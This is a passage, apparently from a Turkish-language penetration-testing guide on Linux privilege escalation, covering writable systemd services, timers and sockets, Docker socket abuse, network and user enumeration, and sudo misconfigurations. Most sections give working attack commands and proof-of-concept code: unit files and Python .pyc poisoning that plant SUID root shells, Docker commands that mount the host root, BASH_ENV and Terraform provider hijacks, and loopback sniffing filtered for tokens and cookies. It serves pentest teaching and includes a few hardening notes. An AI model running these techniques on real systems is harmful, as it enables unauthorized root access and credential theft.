Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin; yazabiliyorsanız, hizmet **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor'unuzu çalıştırmasını** sağlayacak şekilde dosyayı **değiştirebilirsiniz** (makine yeniden başlatılana kadar beklemeniz gerekebilir).\
Örneğin backdoor'unuzu .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile oluşturun

### Yazılabilir service binary'leri

Hizmetler tarafından çalıştırılan binary'ler üzerinde **yazma izinleriniz** varsa, bunları backdoor içerecek şekilde değiştirebileceğinizi unutmayın; böylece hizmetler yeniden çalıştırıldığında backdoor'lar çalıştırılır.

### systemd PATH - Relative Paths

**systemd** tarafından kullanılan PATH'i şu şekilde görebilirsiniz:
```bash
systemctl show-environment
```
Yol üzerindeki klasörlerden herhangi birine **yazabildiğinizi** fark ederseniz **yetkileri yükseltebilirsiniz**. Şunlar gibi **servis yapılandırma** dosyalarında kullanılan **göreli yolları** aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ardından, yazma izniniz olan systemd PATH klasörünün içine **relative path binary** ile **aynı ada sahip bir executable** oluşturun; servis, savunmasız eylemi (**Start**, **Stop**, **Reload**) çalıştırması istendiğinde **backdoor'unuz çalıştırılır** (unprivileged kullanıcılar genellikle servisleri başlatamaz/durduramaz ancak `sudo -l` ile kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında `man systemd.service` ile daha fazla bilgi edinin.**

## **Timer'lar**

**Timer'lar**, adları `**.timer**` ile biten ve `**.service**` dosyalarını veya event'leri kontrol eden systemd unit dosyalarıdır. **Timer'lar**, calendar time event'leri ve monotonic time event'leri için yerleşik desteğe sahip olduklarından cron'a alternatif olarak kullanılabilir ve asynchronous şekilde çalıştırılabilir.

Tüm timer'ları şu komutla enumerate edebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir timer'lar

Bir timer'ı değiştirebiliyorsanız, systemd.unit içindeki bazı öğeleri (örneğin bir `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğunu okuyabilirsiniz:

> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmezse bu değer, son ek dışında timer unit'iyle aynı ada sahip bir service olarak varsayılanır. (Yukarıya bakın.) Etkinleştirilen unit adının ve timer unit'inin, son ek dışında aynı şekilde adlandırılması önerilir.

Bu nedenle, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- **Yazılabilir bir binary çalıştıran** bir systemd unit'i (örneğin bir `.service`) bulun
- **Göreli bir path çalıştıran** ve **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olduğunuz bir systemd unit'i bulun (bu executable'ı taklit etmek için)

**Timer'lar hakkında daha fazla bilgi için `man systemd.timer` komutunu kullanın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına ve şu komutu çalıştırmaya ihtiyacınız vardır:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
`timer`, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` üzerine bir symlink oluşturularak **activated** edilir.

## Socket'ler

Unix Domain Sockets (UDS), client-server modelleri içinde aynı veya farklı makinelerde **process communication** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyaları aracılığıyla yapılandırılırlar.<sup>[[14]](#references)</sup>

Socket'ler `.socket` dosyaları kullanılarak yapılandırılabilir.

**Socket'ler hakkında daha fazla bilgi için `man systemd.socket` komutuna bakın.** Bu dosya içinde çeşitli ilginç parametreler yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler birbirinden farklıdır, ancak bir özet olarak socket'in **nerede dinleme yapacağını belirtmek** için kullanılır (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: Boolean bir değer alır. **true** ise her gelen bağlantı için bir **service instance oluşturulur** ve yalnızca bağlantı socket'i bu instance'a aktarılır. **false** ise tüm dinleme socket'leri doğrudan **başlatılan service unit'e aktarılır** ve tüm bağlantılar için yalnızca bir service unit oluşturulur. Datagram socket'leri ve FIFO'lar için bu değer göz ardı edilir; bu yapılarda gelen tüm trafiği koşulsuz olarak tek bir service unit yönetir. **Varsayılan değer false**'tur. Performans nedenleriyle yeni daemon'ların yalnızca `Accept=no` için uygun olacak şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Dinleme **socket**'leri/FIFO'ları sırasıyla **oluşturulup bind edilmeden önce** veya **sonra** çalıştırılan bir ya da daha fazla command line alır. Command line'ın ilk token'ı absolute filename olmalı, ardından process için argümanlar gelmelidir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **socket**'leri/FIFO'ları sırasıyla **kapatılmadan** ve kaldırılmadan **önce** veya **sonra** çalıştırılan ek **command**'lerdir.
- `Service`: **Incoming traffic** üzerinde **activate edilecek** **service** unit'in adını belirtir. Bu ayara yalnızca `Accept=no` olan socket'lerde izin verilir. Varsayılan olarak socket ile aynı adı taşıyan service'i kullanır (suffix değiştirilir). Çoğu durumda bu seçeneğin kullanılması gerekmez.

### Writable .socket files

**Writable** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz**; böylece backdoor socket oluşturulmadan önce çalıştırılır. Bu nedenle **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekir.**\
_System'in bu socket dosyası yapılandırmasını kullanıyor olması gerekir; aksi hâlde backdoor çalıştırılmaz._

### Socket activation + writable unit path (create missing service)

Bir diğer yüksek etkili yanlış yapılandırma şudur:

- `Accept=no` ve `Service=<name>.service` içeren bir socket unit
- referans verilen service unit eksik
- bir attacker `/etc/systemd/system` (veya başka bir unit search path) içine yazabiliyor

Bu durumda attacker `<name>.service` oluşturabilir ve ardından socket'e traffic göndererek systemd'nin yeni service'i root olarak yükleyip çalıştırmasını sağlayabilir.

Hızlı akış:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Yazılabilir socketler

Herhangi bir **yazılabilir socket** (_burada config `.socket` dosyalarından değil, Unix Sockets'tan bahsediyoruz_), tespit ederseniz bu socket ile **iletişim kurabilir** ve muhtemelen bir güvenlik açığını exploit edebilirsiniz.

### Unix Sockets'ları enumerate etme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**İstismar örneği:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP soketleri

**HTTP** isteklerini dinleyen bazı **soketler** olabilir (_burada .socket dosyalarından değil, unix soketi olarak görev yapan dosyalardan bahsediyorum_). Bunu şu şekilde kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Soket bir **HTTP** isteğine **yanıt veriyorsa**, onunla **iletişim kurabilir** ve muhtemelen **bazı güvenlik açıklarından yararlanabilirsiniz**.

### Writable Docker Socket

Genellikle `/var/run/docker.sock` konumunda bulunan Docker soketi, güvenliği sağlanması gereken kritik bir dosyadır. Varsayılan olarak `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilirdir. Bu sokete yazma erişimine sahip olmak, ayrıcalık yükseltmeye yol açabilir. Bunun nasıl yapılabileceği ve Docker CLI mevcut değilse kullanılabilecek alternatif yöntemler aşağıda açıklanmıştır.

#### **Privilege Escalation with Docker CLI**

Docker soketine yazma erişiminiz varsa aşağıdaki komutları kullanarak ayrıcalıklarınızı yükseltebilirsiniz:<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişimle bir container çalıştırmanıza olanak tanır.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI'nin mevcut olmadığı durumlarda Docker socket, Unix socket üzerinden ham HTTP kullanılarak yine abuse edilebilir. En güvenilir akış şöyledir:

- host root dizininin bind-mounted olduğu, uzun süre çalışan bir helper container oluşturun
- container'ı başlatın
- bu helper içinde bir `exec` instance oluşturun
- `exec` instance'ı başlatın ve çıktıyı API üzerinden geri okuyun

**Docker image'larını listeleme**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Bir helper container oluşturun ve başlatın**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Bir exec instance oluşturun**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**exec instance'ı başlatın ve çıktıyı okuyun**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Bu pattern, `attach` komutunu `socat` veya `nc -U` ile manuel olarak kullanmaya çalışmaktan genellikle daha sağlamdır. `/:/host` ile bir helper oluşturabildiğinizde, `/host/root/...` gibi dosyaları okumak, `/host/root/.ssh` altına SSH key'leri eklemek veya host startup dosyalarını değiştirmek için ek `exec` örneklerini kullanabilirsiniz.

### Diğerleri

**`docker` grubunun içinde** olduğunuz için docker socket üzerinde yazma izinlerine sahipseniz, [**yetki yükseltmek için daha fazla yönteminiz**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) olduğunu unutmayın. [**docker API bir portu dinliyorsa**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising) onu da compromise edebilirsiniz.

**Container'lardan çıkmak veya yetki yükseltmek için container runtime'larını kötüye kullanmak için daha fazla yöntemi** şurada inceleyin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

`ctr` komutunu kullanabildiğinizi fark ederseniz aşağıdaki sayfayı okuyun; **yetki yükseltmek için onu kötüye kullanabilirsiniz**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

`runc` komutunu kullanabildiğinizi fark ederseniz aşağıdaki sayfayı okuyun; **yetki yükseltmek için onu kötüye kullanabilirsiniz**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir **inter-Process Communication (IPC) system**'dir. Modern Linux system göz önünde bulundurularak tasarlanan bu sistem, farklı uygulama iletişimi biçimleri için sağlam bir framework sunar.<sup>[[16]](#references)</sup>

System çok yönlüdür; **enhanced UNIX domain sockets**'i andıran ve process'ler arasındaki veri alışverişini geliştiren temel IPC'yi destekler. Ayrıca event veya signal'ları broadcast ederek system component'leri arasında sorunsuz bir entegrasyon sağlar. Örneğin, Bluetooth daemon'undan gelen bir incoming call signal'ı, bir music player'ın sesi kapatmasını tetikleyerek kullanıcı deneyimini iyileştirebilir. Buna ek olarak D-Bus, remote object system'i destekleyerek uygulamalar arasındaki service request'lerini ve method invocation'larını basitleştirir; geleneksel olarak karmaşık olan process'leri kolaylaştırır.

D-Bus, message permission'larını (method call'ları, signal emission'ları vb.) eşleşen policy rule'larının kümülatif etkisine göre yöneten bir **allow/deny model** üzerinde çalışır. Bu policy'ler bus ile etkileşimleri belirler ve bu permission'ların exploitation'ı yoluyla olası bir privilege escalation sağlayabilir.

`/etc/dbus-1/system.d/wpa_supplicant.conf` içindeki böyle bir policy örneğinde, root user'ın `fi.w1.wpa_supplicant1`'e ait olma, buraya mesaj gönderme ve buradan mesaj alma izinleri ayrıntılı olarak belirtilmiştir.

Belirli bir user veya group belirtilmeyen policy'ler evrensel olarak uygulanırken, `"default"` context policy'leri diğer özel policy'ler tarafından kapsanmayan tüm durumlara uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus communication enumeration ve exploit işlemlerini burada öğrenin:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu belirlemek her zaman ilgi çekicidir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Dışa giden filtreleme için hızlı ön inceleme

Ana bilgisayar komut çalıştırabiliyor ancak callback'ler başarısız oluyorsa DNS, transport, proxy ve route filtrelemesini hızlıca birbirinden ayırın:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Açık portlar

Makineye erişmeden önce, daha önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Dinleyicileri bind hedeflerine göre sınıflandırın:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde erişime açık.
- `127.0.0.1` / `::1`: yalnızca yerel (iyi tunnel/forward adayları).
- Belirli dahili IP'ler (ör. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca dahili segmentlerden erişilebilir.

### Yalnızca yerel servisleri önceliklendirme workflow'u

Bir host'u compromise ettiğinizde, `127.0.0.1` adresine bind edilmiş servisler çoğu zaman shell'iniz üzerinden ilk kez erişilebilir hâle gelir. Hızlı bir yerel workflow şöyledir:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS bir network scanner olarak (network-only mode)

Yerel PE kontrollerinin yanı sıra linPEAS, odaklanmış bir network scanner olarak çalışabilir. `$PATH` içinde bulunan binary'leri (genellikle `fping`, `ping`, `nc`, `ncat`) kullanır ve tooling yüklemez.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
`-t` olmadan `-d`, `-p` veya `-i` kullanırsanız linPEAS, salt bir network scanner olarak çalışır (privilege-escalation kontrollerinin geri kalanını atlar).

### Sniffing

Trafiği sniff edip edemediğinizi kontrol edin. Edebilirseniz bazı kimlik bilgilerini ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
Hızlı pratik kontroller:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`), post-exploitation aşamasında özellikle değerlidir; çünkü yalnızca dahili olan birçok servis token/cookie/credential'ları burada açığa çıkarır:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Şimdi yakala, daha sonra ayrıştır:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Kullanıcılar

### Genel Enumeration

**kim** olduğunuzu, hangi **yetkilere** sahip olduğunuzu, sistemlerde hangi **kullanıcıların** bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root yetkilerine** sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** değerine sahip kullanıcıların yetkilerini yükseltmesine olanak tanıyan bir bug'dan etkilenmiştir. Daha fazla bilgi için: [buraya](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [buraya](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [buraya](https://twitter.com/paragonsec/status/1071152249529884674) bakın.<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit etmek** için: **`systemd-run -t /bin/bash`**

### Groups

Root yetkileri sağlayabilecek bir **group**'un **üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Mümkünse clipboard içinde ilginç bir şey olup olmadığını kontrol edin.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Ortamın **herhangi bir parolasını biliyorsanız**, parolayı kullanarak **her kullanıcı olarak login olmayı deneyin**.

### Su Brute

Çok fazla gürültü oluşturmaktan çekinmiyorsanız ve bilgisayarda `su` ile `timeout` binary'leri mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcılar üzerinde brute-force deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), `-a` parametresiyle kullanıcılar üzerinde brute-force denemeyi de dener.

## Yazılabilir PATH abuse'ları

### $PATH

**$PATH içindeki bir klasöre yazabildiğinizi** fark ederseniz, **yazılabilir klasörün içinde**, farklı bir kullanıcı (ideal olarak root) tarafından çalıştırılacak ve **$PATH içinde yazılabilir klasörünüzden önce bulunan bir klasörden yüklenmeyen** bir komutun adıyla **bir backdoor oluşturarak** privilege escalation yapabilirsiniz.

### SUDO ve SUID

sudo kullanarak bazı komutları çalıştırmanıza izin veriliyor olabilir veya bu komutlarda suid biti bulunabilir. Şunu kullanarak kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza ya da bir komut çalıştırmanıza olanak tanır**.<sup>[[8]](#references)</sup> Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının parolayı bilmeden bazı komutları başka bir kullanıcının ayrıcalıklarıyla çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte `demo` kullanıcısı `vim` komutunu `root` olarak çalıştırabilir; root dizinine bir SSH key ekleyerek veya `sh` çağırarak shell elde etmek artık oldukça kolaydır.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **bir ortam değişkeni ayarlamasına** olanak tanır:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB makinesi Admirer** temel alınarak, betik root olarak yürütülürken keyfi bir python library yüklemek için **PYTHONPATH hijacking** işlemine karşı **vulnerable** durumdaydı:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo-allowed Python imports içinde yazılabilir `__pycache__` / `.pyc` poisoning

Bir **sudo-allowed Python script**, package directory'si yazılabilir bir **`__pycache__`** içeren bir modülü import ediyorsa, cached `.pyc` dosyasını replace ederek sonraki import işleminde privileged user olarak code execution elde edebilirsiniz.<sup>[[30]](#references)</sup>

- Neden çalışır:
- CPython, bytecode cache'lerini `__pycache__/module.cpython-<ver>.pyc` içinde depolar.<sup>[[31]](#references)</sup>
- Interpreter, **header**'ı (source'a bağlı magic + timestamp/hash metadata) doğrular, ardından bu header'dan sonra depolanan marshaled code object'i çalıştırır.
- Directory yazılabilir olduğu için cached file'ı **delete and recreate** edebiliyorsanız, root-owned ancak non-writable bir `.pyc` yine de replace edilebilir.
- Typical path:
- `sudo -l`, root olarak çalıştırabileceğiniz bir Python script veya wrapper gösterir.
- Bu script, `/opt/app/`, `/usr/local/lib/...` vb. bir local module import eder.
- Imported module'ün `__pycache__` directory'si user'ınız veya herkes tarafından yazılabilir durumdadır.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Privileged script'i inceleyebiliyorsanız, içe aktarılan modülleri ve bunların cache yolunu belirleyin:<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Kötüye kullanma iş akışı:

1. Python'ın meşru cache dosyasını henüz mevcut değilse oluşturması için sudo-allowed script'i bir kez çalıştırın.
2. Meşru `.pyc` dosyasından ilk 16 byte'ı okuyun ve bunları poisoned file içinde yeniden kullanın.
3. Bir payload code object derleyin, `marshal.dumps(...)` ile serileştirin, orijinal cache dosyasını silin ve orijinal header ile malicious bytecode'u birleştirerek dosyayı yeniden oluşturun.
4. Import işleminin payload'unuzu root olarak çalıştırması için sudo-allowed script'i yeniden çalıştırın.

Önemli notlar:

- Orijinal header'ı yeniden kullanmak kritiktir; çünkü Python cache metadata'sını bytecode gövdesinin gerçekten source ile eşleşip eşleşmediğine göre değil, source file'a göre kontrol eder.
- Bu yöntem özellikle source file root-owned ve yazılabilir değilken, dosyayı içeren `__pycache__` directory'si yazılabilir olduğunda kullanışlıdır.
- Privileged process `PYTHONDONTWRITEBYTECODE=1` kullanıyorsa, safe permissions'a sahip bir konumdan import yapıyorsa veya import path içindeki tüm directory'lerdeki yazma erişimini kaldırıyorsa attack başarısız olur.

Minimal proof-of-concept biçimi:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Ayrıcalıklı Python import path içindeki hiçbir dizinin, `__pycache__` dahil olmak üzere, düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmadığından emin olun.
- Ayrıcalıklı çalıştırmalar için `PYTHONDONTWRITEBYTECODE=1` kullanmayı ve beklenmedik şekilde yazılabilir `__pycache__` dizinleri için periyodik kontroller yapmayı değerlendirin.
- Yazılabilir yerel Python modüllerini ve yazılabilir cache dizinlerini, root tarafından çalıştırılan yazılabilir shell script'leri veya paylaşılan kütüphanelerle aynı şekilde değerlendirin.

### sudo env_keep üzerinden korunan BASH_ENV → root shell

sudoers `BASH_ENV` değişkenini koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çağırırken root olarak rastgele kod çalıştırmak için Bash'in etkileşimsiz başlangıç davranışından yararlanabilirsiniz.<sup>[[24]](#references)</sup>

- Nasıl çalışır: Etkileşimsiz shell'lerde Bash, hedef script'i çalıştırmadan önce `$BASH_ENV` değişkenini değerlendirir ve bu dosyayı source eder. Birçok sudo kuralı bir script'in veya shell wrapper'ın çalıştırılmasına izin verir. `BASH_ENV`, sudo tarafından korunuyorsa dosyanız root ayrıcalıklarıyla source edilir.<sup>[[23]](#references)</sup>

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz şekilde `/bin/bash` çağıran herhangi bir hedef veya herhangi bir bash script'i).
- `BASH_ENV` değişkeninin `env_keep` içinde bulunması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sıkılaştırma:
- `BASH_ENV` (ve `ENV`) değişkenlerini `env_keep` listesinden kaldırın, `env_reset` tercih edin.
- sudo ile izin verilen komutlar için shell wrapper kullanmaktan kaçının; minimal binary'ler kullanın.
- Korunan env değişkenleri kullanıldığında sudo I/O logging ve alerting kullanmayı değerlendirin.

### Terraform via sudo with preserved HOME (!env_reset)

sudo ortamı olduğu gibi bırakırsa (`!env_reset`) ve `terraform apply` komutuna izin verirse, `$HOME` çağrıyı yapan kullanıcı olarak kalır. Bu nedenle Terraform, **$HOME/.terraformrc** dosyasını root olarak yükler ve `provider_installation.dev_overrides` ayarına uyar.<sup>[[25]](#references)</sup>

- Gerekli provider'ı yazılabilir bir dizine yönlendirin ve provider'ın adını taşıyan kötü amaçlı bir plugin bırakın (ör. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
